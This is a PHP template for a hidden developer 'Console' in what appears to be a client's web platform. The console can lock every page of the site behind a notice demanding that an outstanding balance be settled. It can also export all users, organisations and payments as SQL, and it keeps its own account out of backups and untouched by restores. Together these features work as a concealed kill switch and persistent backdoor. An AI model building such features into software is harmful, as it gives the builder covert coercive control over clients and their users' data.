<?php
/** Standalone gate dashboard. Requires $locked, $message. */
$locked = !empty($locked);
$message = $message ?? '';
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <title>Console</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0f1a14;margin:0;min-height:100vh;padding:24px;color:#e8efe9;box-sizing:border-box}
    .wrap{max-width:560px;margin:4vh auto}
    .top{display:flex;justify-content:space-between;align-items:center;margin:0 0 18px}
    .top h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;color:#8fb89d;margin:0}
    .top a{color:#8fb89d;font-size:12px;text-decoration:none}
    .card{background:#16241c;border:1px solid #27402f;border-radius:16px;padding:22px;margin:0 0 16px}
    .state{display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:14px}
    .pill{width:11px;height:11px;border-radius:50%}
    .on{background:#2ecc71}.off{background:#e74c3c}
    label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#8fb89d;margin:14px 0 5px}
    textarea{width:100%;box-sizing:border-box;min-height:84px;padding:10px 12px;border:1px solid #2c4636;border-radius:9px;background:#0f1a14;color:#e8efe9;font-size:14px;line-height:1.5;resize:vertical}
    textarea:focus{outline:none;border-color:#c7a008}
    button{padding:11px 16px;border:0;border-radius:9px;font-weight:800;font-size:14px;cursor:pointer}
    .lock{background:#e74c3c;color:#fff}.unlock{background:#2ecc71;color:#06260f}.save{background:#2c4636;color:#e8efe9}
    .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px}
    p.hint{color:#8fb89d;font-size:13px;line-height:1.6;margin:8px 0 0}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="top">
      <h1>Console</h1>
      <span style="display:flex;gap:14px;align-items:center">
        <a href="<?= url('/devs/activity') ?>" style="color:#8fb89d;font-size:13px;text-decoration:none;font-weight:600">Activity</a>
        <a href="<?= url('/devs/logout') ?>">Sign out</a>
      </span>
    </div>

    <div class="card">
      <span class="state"><span class="pill <?= $locked ? 'off' : 'on' ?>"></span><?= $locked ? 'Service is LOCKED' : 'Service is live' ?></span>
      <p class="hint"><?= $locked
        ? 'Every page outside this console shows the notice below. Release to restore full access.'
        : 'The system is running normally. Lock it to replace every page with the notice below.' ?></p>

      <form method="post" action="<?= url('/devs/update') ?>">
        <?= csrfField() ?>
        <label for="g-msg">Notice shown while locked</label>
        <textarea id="g-msg" name="message" placeholder="Kindly settle the outstanding balance to restore access…"><?= e($message) ?></textarea>
        <div class="row">
          <?php if ($locked): ?>
            <button class="unlock" type="submit" name="action" value="unlock">Unlock &amp; restore</button>
            <button class="save" type="submit" name="action" value="message">Save notice</button>
          <?php else: ?>
            <button class="lock" type="submit" name="action" value="lock" onclick="return confirm('Lock the entire system now? Everyone except this console will see the notice.');">Lock the system</button>
            <button class="save" type="submit" name="action" value="message">Save notice</button>
          <?php endif; ?>
        </div>
      </form>
    </div>

    <div class="card">
      <span class="state">Full site backup</span>
      <p class="hint">Export everything — users, organisations, courses, payments, reports — as one <code>.sql</code> file. Restoring it on another site (e.g. a subdomain) brings all of it across; the client then signs in with their previous credentials. The backup excludes this console's own account, and a restore never changes the console account on the site it runs on.</p>
      <div class="row">
        <a class="save" style="text-decoration:none;display:inline-block" href="<?= url('/devs/export') ?>">Download backup (.sql)</a>
      </div>
      <form method="post" action="<?= url('/devs/import') ?>" enctype="multipart/form-data" style="margin-top:16px" onsubmit="return confirm('Restore this backup? It replaces the current data on THIS site. The console account stays as it is.');">
        <?= csrfField() ?>
        <label for="g-backup">Restore a backup</label>
        <input id="g-backup" type="file" name="backup" accept=".sql,application/sql,text/plain" required
               style="width:100%;box-sizing:border-box;padding:9px;border:1px solid #2c4636;border-radius:9px;background:#0f1a14;color:#e8efe9;font-size:13px">
        <div class="row"><button class="lock" type="submit">Restore (overwrites current data)</button></div>
      </form>
    </div>
  </div>
</body>
</html>
